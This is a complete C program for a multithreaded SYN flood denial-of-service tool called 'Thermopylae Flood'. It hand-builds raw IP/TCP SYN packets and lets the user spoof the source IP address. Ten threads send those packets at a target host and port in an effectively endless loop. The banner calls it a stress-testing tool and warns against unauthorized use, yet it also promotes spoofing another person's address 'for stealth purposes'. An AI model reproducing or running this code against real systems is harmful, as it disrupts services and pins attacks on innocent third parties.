#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>

#define DEFAULT_S_PORT 52638
#define DEFAULT_D_PORT 80

#define DEFAULT_S_IP "10.56.5.179"
#define DEFAULT_D_IP "10.56.5.31"

#define NUMBER_OF_THREADS 10
#define PACKETS_PER_THREAD 10000000000


/* ─── ANSI Color Codes ─────────────────────────────────────────── */
#define RESET       "\033[0m"
#define BOLD        "\033[1m"
#define DIM         "\033[2m"

#define FG_CYAN     "\033[36m"
#define FG_WHITE    "\033[37m"
#define FG_BRED     "\033[1;31m"
#define FG_BGREEN   "\033[1;32m"
#define FG_BYELLOW  "\033[1;33m"
#define FG_BWHITE   "\033[1;37m"
/* ─── ANSI Color Codes ─────────────────────────────────────────── */


typedef struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t destination_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;

}pseudo_header;

typedef struct thread_args
{
	int flood_fd;
	char packet_to_be_send[4096];
	int tot_len;
	struct sockaddr sin;

}thread_args;

unsigned short checksum(unsigned short *ptr, int bytes)
{
	u_int32_t sum;
	u_int16_t leftbyte;

	sum = 0;

	while(bytes > 1)
	{
		sum += *ptr;
		ptr++;
		bytes -= 2;
	}

	if(bytes == 1)
	{
		leftbyte = 0;
		*((u_int8_t*)&leftbyte) = *(u_int8_t*)ptr;
		sum += leftbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = (sum >> 16) + (sum & 0xffff);
	return((u_int16_t)~sum);

}


void* sender(void* arg)
{

	thread_args* args = (thread_args*)arg;
	int local_fd;

	if((local_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
	{
		perror("[-] local socket creation failed");
		return NULL;
	}

	printf("started\n");
	for(register int i = 0 ; i < PACKETS_PER_THREAD ; i++)
	{

		sendto(local_fd, args->packet_to_be_send, args->tot_len, 0, (struct sockaddr*)&args->sin, sizeof(args->sin));

	}

	close(local_fd);
	return NULL;

}

void ip_input_checker(char*, char*);
void port_input_checker(int*);

void buffercleaner(void);
void print_banner(void);


int main(void)
{	
	print_banner();

	char source_ip_address[18]; int source_port = DEFAULT_S_PORT;
	char dest_ip_address[18]; int dest_port = DEFAULT_D_PORT;

	printf("[+] Enter the source IP (You can also spoof the ip of yours) (default is %s) >>>> ", DEFAULT_S_IP);
	ip_input_checker(source_ip_address, DEFAULT_S_IP);
	printf("[+] Enter the source port (default is %d) >>>> ", source_port);
	port_input_checker(&source_port);

	printf("[+] Enter the dest IP (default is %s)>>>> ", DEFAULT_D_IP);
	ip_input_checker(dest_ip_address, DEFAULT_D_IP);
	printf("[+] Enter the dest port (default is %d) >>>> ", dest_port);
	port_input_checker(&dest_port);


	int flood_fd = -1;

	if((flood_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
	{
		perror("[-] Sokcet creation failed");
		exit(EXIT_FAILURE);
	}


	char packet[4096], *data = NULL, *checksum_buffer_storage = NULL;
	memset(packet, 0, 4096);


	struct iphdr *iph = (struct iphdr*)packet;
	struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
	struct sockaddr_in sin;
	pseudo_header psh;

	data = (char*)tcph + sizeof(struct tcphdr);
	snprintf(data, 27, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");

	dest_ip_address[strcspn(dest_ip_address, "\n")] = '\0';

	sin.sin_family = AF_INET;
	sin.sin_port = htons(dest_port);

	if(inet_pton(AF_INET, dest_ip_address, &sin.sin_addr) <= 0)
	{
		perror("[-] Invalid destination_address");
		exit(EXIT_FAILURE);
	}



	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
	iph->id = htons(4000);
	iph->frag_off = 0;
	iph->ttl = 90;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	if(inet_pton(AF_INET, source_ip_address, &(iph->saddr)) <= 0)
	{
		perror("[-] Invalid source_address");
		exit(EXIT_FAILURE);
	}
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = checksum((unsigned short*)packet, iph->tot_len);



	tcph->source = htons(source_port);
	tcph->dest = htons(dest_port);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;
	tcph->fin = 0;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->syn = 1;
	tcph->window = htons(5840);
	tcph->urg_ptr = 0;
	tcph->check = 0;



	if(inet_pton(AF_INET, source_ip_address, &psh.source_address) <= 0)
	{
		perror("[-] Invalid source_ip");
		exit(EXIT_FAILURE);
	}
	psh.destination_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));

	u_int16_t packet_size = sizeof(pseudo_header) + sizeof(struct tcphdr) + strlen(data);
	checksum_buffer_storage = (char*)malloc(packet_size);
	memcpy(checksum_buffer_storage, &psh, sizeof(pseudo_header));
	memcpy(checksum_buffer_storage + sizeof(pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));


	tcph->check = checksum((unsigned short*)checksum_buffer_storage, packet_size);
	free(checksum_buffer_storage);

	thread_args args_array[NUMBER_OF_THREADS];
	thread_args thread_args_blueprint;

	thread_args_blueprint.flood_fd = flood_fd;
	memcpy(thread_args_blueprint.packet_to_be_send, packet, 4096);
	thread_args_blueprint.tot_len = iph->tot_len;
	memcpy(&(thread_args_blueprint.sin), &sin, sizeof(struct sockaddr_in));

	pthread_t thread_id[NUMBER_OF_THREADS];

	for(register int j = 0 ; j < NUMBER_OF_THREADS ; j++)
	{
		memcpy(&args_array[j], &thread_args_blueprint, sizeof(thread_args));
		if(pthread_create(&thread_id[j], NULL, sender, &args_array[j]) != 0)
		{

			perror("Thread creation failed");
			exit(EXIT_FAILURE);

		}

	}


	for(register int k = 0 ; k < NUMBER_OF_THREADS ; k++)
	{
		pthread_join(thread_id[k], NULL);
	}

	return 0;

}


void ip_input_checker(char *ip_address, char *default_ip)
{	

	while(1)
	{	

		if(fgets(ip_address, 17, stdin) == NULL)
		{
			printf("[-] Please enter a valid ip_address >>>> ");
			continue;
		}

		if(ip_address[0] == '\n')
		{
			snprintf(ip_address, 18, "%s", default_ip);
			break;
		}

		char *newline = strchr(ip_address, '\n');
		if(newline == NULL)
		{
			buffercleaner();
			printf("[-] Please enter a valid ip_address >>>> ");
			continue;
		}

		*newline = '\0';
		if(inet_pton(AF_INET, ip_address, &(struct in_addr){0}) == 1) break;
		printf("[-] Please enter a valid ip_address >>>> ");
	}

}


void port_input_checker(int *port)
{
    char str_port[7];
    while(1)
    {
        if(fgets(str_port, 6, stdin) == NULL)
        {
            printf("[-] Please enter a valid port (1-65535) >>>> ");
            continue;
        }

        if(str_port[0] == '\n') break;

        if(strchr(str_port, '\n') == NULL) 
        {
            buffercleaner();
            printf("[-] Please enter a valid port (1-65535) >>>> ");
            continue;
        }

        int parsed = atoi(str_port);
        if(parsed >= 1 && parsed <= 65535)
        {
            *port = parsed;
            break;
        }

        printf("[-] Please enter a valid port (1-65535) >>>> ");
    }
}


void buffercleaner(void)
{
	int x;
	while((x = getchar()) != '\n' && x != EOF);
}


// NOTE :- The banner is developed with help of claude AI


void print_banner(void) {

	system("clear");

    printf("\n");
    printf(FG_CYAN "  ╔═══════════════════════════════════════════════════════════════╗\n" RESET);
    printf(FG_CYAN "  ║                                                               ║\n" RESET);
    printf(FG_BRED BOLD
    "  ║  ████████╗██╗  ██╗███████╗██████╗ ███╗   ███╗ ██████╗         ║\n"
    "  ║  ╚══██╔══╝██║  ██║██╔════╝██╔══██╗████╗ ████║██╔═══██╗        ║\n"
    "  ║     ██║   ███████║█████╗  ██████╔╝██╔████╔██║██║   ██║        ║\n"
    "  ║     ██║   ██╔══██║██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║        ║\n"
    "  ║     ██║   ██║  ██║███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝        ║\n"
    "  ║     ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝         ║\n" RESET);
    printf(FG_CYAN "  ║                                                               ║\n" RESET);
    printf(FG_BRED BOLD
    "  ║  ███████╗██╗      ██████╗  ██████╗ ██████╗                    ║\n"
    "  ║  ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗                   ║\n"
    "  ║  █████╗  ██║     ██║   ██║██║   ██║██║  ██║                   ║\n"
    "  ║  ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║                   ║\n"
    "  ║  ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝                   ║\n"
    "  ║  ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝                    ║\n" RESET);
    printf(FG_CYAN "  ║                                                               ║\n" RESET);
    printf(FG_CYAN "  ║  " RESET FG_BGREEN "  SYN Flood Network Stress Testing Tool                    " RESET FG_CYAN "  ║\n" RESET);
    printf(FG_CYAN "  ║  " RESET FG_BRED BOLD "  Inspired by Thermopylae war                    " RESET FG_CYAN "  	  ║\n" RESET);
    printf(FG_CYAN "  ║  " RESET DIM FG_WHITE "  By Piyumila Perera | Network Security Research | v1.0.0" RESET FG_CYAN "    ║\n" RESET);
    printf(FG_CYAN "  ╚═══════════════════════════════════════════════════════════════╝\n" RESET);
    printf("\n");
    printf(FG_BWHITE BOLD "  Usage:\n" RESET);
    printf(FG_BRED "  ❯ " RESET "Specify a source IP and port to begin the flood sequence.\n");
    printf(FG_BRED "  ❯ " RESET "Specify a destination IP and port to begin the flood sequence.\n");
    printf( "  ❯ " RESET FG_BRED BOLD "The main benefit of this tool is that you can spoof your ip address as someone else's for stealth purposes.\n");


    printf("\n");
    printf(FG_CYAN DIM "  ⓘ  Warning: Use only on systems you own or have explicit\n" RESET);
    printf(FG_CYAN DIM "     written permission to test. Unauthorized use is illegal.\n" RESET);
    printf("\n");
}